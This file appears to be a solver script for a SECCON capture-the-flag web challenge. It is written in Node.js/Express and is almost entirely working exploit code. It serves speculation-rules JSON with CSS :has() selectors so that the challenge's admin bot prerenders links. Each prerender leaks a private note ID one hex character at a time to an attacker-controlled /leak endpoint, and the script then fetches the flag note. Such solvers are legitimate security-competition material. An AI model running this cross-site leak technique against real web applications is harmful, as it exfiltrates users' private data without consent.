const app = require("express")();
const fs = require("node:fs");

const PORT = "8080";
const SECCON_HOST = 
	process.env.SECCON_HOST ?? console.log("No SECCON_HOST") ?? process.exit(1);
const CONNECTBACK_URL = 
	process.env.CONNECTBACK_URL ?? console.log("No CONNECTBACK_URL") ?? process.exit(1);
const WEB_PORT = "3000";
const BOT_PORT = "1337";

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const sleep = (msecs) => new Promise((resolve) => setTimeout(resolve, msecs));

const reportUrl = (url) =>
  fetch(`http://${SECCON_HOST}:${BOT_PORT}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const html = fs.readFileSync("index.html");

const CHARS = "0123456789abcdef";
let prefix = "";

app.get("/", (req, res) => {
	res.header("Content-Type", "text/html");
	res.send(html);
});

app.get("/leak", (req, res) => {
	prefix = req.query.prefix;
	console.log(req.query.prefix);
	res.send();
});

app.get("/rules", (req, res) => {
	const prefixes = [...CHARS].map(c => prefix + c);
	const selectors = prefixes.map((pref, i) => `:has(ul li:first-child a:first-child[href^="/note/${pref}"]) ul li:nth-last-child(${prefixes.length - i}) a`);

	res.header("Access-Control-Allow-Origin", "*");
	res.header("Content-Type", "application/speculationrules+json");
	res.json({
		"prerender": [{
			"eagerness": "immediate", 
			"where": {
				"selector_matches": selectors
			}
		}
	]});
});

app.get("/prefix", (req, res) => {
	return res.send(prefix);
});

app.get("/flag", async (req, res) => {
	const note = await fetch(`http://${SECCON_HOST}:${WEB_PORT}/note/${prefix}`).then(r=>r.text());
	console.log(note.replaceAll("&lt;", "<").replaceAll("&gt;", ">"));
	process.exit(0);
});

app.listen(PORT, "0.0.0.0", async () => {
	for (var i = 0; i < 3; i++) {
		await (async () => {
			console.log(`Try ${i}`);
			prefix = ""
			await reportUrl(`${CONNECTBACK_URL}?target=http://web:3000`);
			await sleep(90 * 1000);
		})().catch((e) => {
			console.error("Error:");
			console.error(e);
		});
	}
	
	fail("Failed");
});
